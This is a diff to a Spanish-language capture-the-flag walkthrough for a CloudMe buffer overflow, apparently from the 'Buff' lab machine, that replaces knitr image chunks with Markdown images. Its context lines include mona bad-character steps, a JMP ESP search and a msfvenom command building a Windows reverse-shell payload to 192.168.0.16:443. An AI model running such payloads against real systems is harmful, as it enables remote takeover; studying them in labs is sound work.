@@ -541,9 +541,7 @@ Tenemos que empezar por buscar estos **BadChars**.
  !mona config -set workingfolder C:\Users\S4vitar\Desktop\%p 
 ```
 
-    ```{r, echo = FALSE, fig.cap="Mona Set working directory", out.width="90%"}
-        knitr::include_graphics("images/Buff-mona_set_wdir.png")
-    ```
+    ![Mona Set working directory](images/Buff-mona_set_wdir.png){ style="width:90%;" }
 
 1. Utilizamos mona para crear una lista de todos los caracteres en Hexadecimal
 
@@ -600,9 +598,7 @@ Tenemos que empezar por buscar estos **BadChars**.
 
 1. En el Immunity debugger con mona miramos que caracteres no an sido interpretado
 
-    ```{r, echo = FALSE, fig.cap="Buf Bad chars", out.width="90%"}
-        knitr::include_graphics("images/Buff-BadChars.png")
-    ```
+    ![Buf Bad chars](images/Buff-BadChars.png){ style="width:90%;" }
 
     ```bash
     !mona compare -f C:\Users\S4vitar\Desktop\CloudMe\bytearray.txt -a 0022D470
@@ -617,9 +613,7 @@ tengamos mas **BadChars**. Y desde aqui nos podemos crear el script malicioso co
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.16 LPORT=443 -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f c
 ```
 
-```{r, echo = FALSE, fig.cap="Buf Shell code", out.width="90%"}
-    knitr::include_graphics("images/Buff-Shell-code.png")
-```
+![Buf Shell code](images/Buff-Shell-code.png){ style="width:90%;" }
 
 ```python
 #!/usr/bin/python3
@@ -674,9 +668,7 @@ if __name__ == "__main__":
 
 #### Etapa 6: Asignar el opcode al EIP {-}
 
-```{r, echo = FALSE, fig.cap="Buf opcode", out.width="90%"}
-    knitr::include_graphics("images/Buff-jmpesp.png")
-```
+![Buf opcode](images/Buff-jmpesp.png){ style="width:90%;" }
 
 Como dicho precedamente, no podemos meter la direccion del **ESP** directamente en el **EIP** para ejecutar el Shell code.
 Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el commando **JMPESP** para redirigirnos al Shell code.
@@ -695,9 +687,7 @@ Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el com
 
 1. En internet buscamos el opcode [defuse.ca](https://defuse.ca/online-x86-assembler.htm)
 
-    ```{r, echo = FALSE, fig.cap="Buf no protected modules", out.width="90%"}
-    knitr::include_graphics("images/Buff-protection_false.png")
-    ```
+    ![Buf no protected modules](images/Buff-protection_false.png){ style="width:90%;" }
 
 1. Buscar el opcode (en este caso
 
